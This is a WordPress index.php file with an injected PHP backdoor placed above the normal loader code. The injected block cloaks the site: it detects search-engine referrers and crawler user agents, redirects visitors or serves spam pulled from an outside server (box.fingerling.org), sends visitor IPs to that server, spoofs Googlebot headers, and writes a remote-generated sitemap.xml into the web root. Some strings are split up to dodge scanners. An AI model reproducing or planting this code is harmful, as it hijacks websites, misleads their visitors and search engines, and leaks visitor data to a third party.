<?php 
$mdhost =$_SERVER['HTTP_HOST'];
$headrui = $_SERVER['REQUEST_URI'];
    $bhead =  md5($mdhost);
    $bhead = substr(md5($mdhost),0,6);
    $ckhead = substr($headrui,1,6);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://'; 
$ref = @strtolower($_SERVER['HTTP_REFERER']);
if (strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
if($headrui=='/'){
     $ipipip = ipipip();
    $tourl = get_url_con('http://box.fingerling.org/hui/shop/ED2/keyurls.php?toweb=mask&host='.$_SERVER['HTTP_HOST'].'&url='.$_SERVER['REQUEST_URI'].'&ip='.$ipipip);
        if(!empty($tourl)){
            header('location:'.$tourl);
            exit;
        }
}
    if($bhead==$ckhead){
        $hulr = substr($headrui,7);
        $hurl = trim($hulr,'/');
        $filesarr = explode("_", $hurl);
        $ipipip = ipipip();
        $tourl = get_url_con('http://box.fingerling.org/hui/ED2/office/keyurls.php?toweb='.$filesarr[0]."&host=".$_SERVER['HTTP_HOST'].'&url='.$_SERVER['REQUEST_URI'].'&ip='.$ipipip);
        if(!empty($tourl)){
            header('location:'.$tourl);
            exit;
        }
        
    }
}
$tmp = @strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($tmp, 'google') !== false || strpos ($tmp, 'yahoo') !== false || strpos ($tmp, 'msn') !== false || strpos ($tmp, 'sqworm') !== false){
$hhtest  = !empty($_GET['hhtest'])?$_GET['hhtest']:'';
if($hhtest=='test'||$headrui=='/'){
$con= get_url_con('http://box.fingerling.org/hui/shop/ED2/input.php?buy=test&bj='.$bhead.'&host='.$_SERVER['HTTP_HOST']);
creatsitemap();
echo $con;
exit;
}
if($bhead==$ckhead){
    $hulr = substr($headrui,7);
    $hurl = trim($hulr,'/');
    $con= get_url_con('http://box.fingerling.org/hui/shop/ED2/input.php?buy='.$hurl.'&bj='.$bhead.'&host='.$_SERVER['HTTP_HOST']);
    echo $con;
        exit;
}

    }


if (isset($_GET['dzlink'])) {
    $dzlink = get_url_con('http://box.fingerling.org/hui/shop/ED2/links.php?gethost='.$http_type.$_SERVER['HTTP_HOST'].'&bj='.$bhead.'&num='.$_GET['dzlink']);
    echo $dzlink;
    exit(); 
}
function ipipip() {
    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    $res =  preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
    return $res;
}
function get_url_con($con_s){
$fgcot = @file_get_contents($con_s);if($fgcot){return $fgcot;}else{$s = curl_init();curl_setopt($s,CURLOPT_URL,$con_s);curl_setopt($s,CURLOPT_RETURNTRANSFER,1);curl_setopt($s, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($s,CURLOPT_SSL_VERIFYPEER, false);curl_setopt($s,CURLOPT_SSL_VERIFYHOST,false);curl_setopt($s,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');curl_setopt($s,CURLOPT_REFERER,"http://www.google.com");curl_setopt($s, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.72.240', 'CLIENT-IP:66.249.72.240'));return curl_exec($s);}
}
function creatsitemap(){
    $FILE_DIR = $_SERVER['DOCUMENT_ROOT']."/sitemap.xml";
    if(!file_exists($FILE_DIR)){
        $mdhost =$_SERVER['HTTP_HOST'];
    $bhead =  md5($mdhost);
    $bhead = substr(md5($mdhost),0,6);
        $http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://'; 
        $dzxml = get_url_con('http://box.fingerling.org/hui/shop/ED2/links.php?xmlhost='.$http_type.$_SERVER['HTTP_HOST'].'&bj='.$bhead.'&num=40000');
        $dzxml=htmlspecialchars_decode($dzxml);
        file_put_contents($_SERVER['DOCUMENT_ROOT']."/sitemap.xml",$dzxml);
    }
}

 ?><?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );?>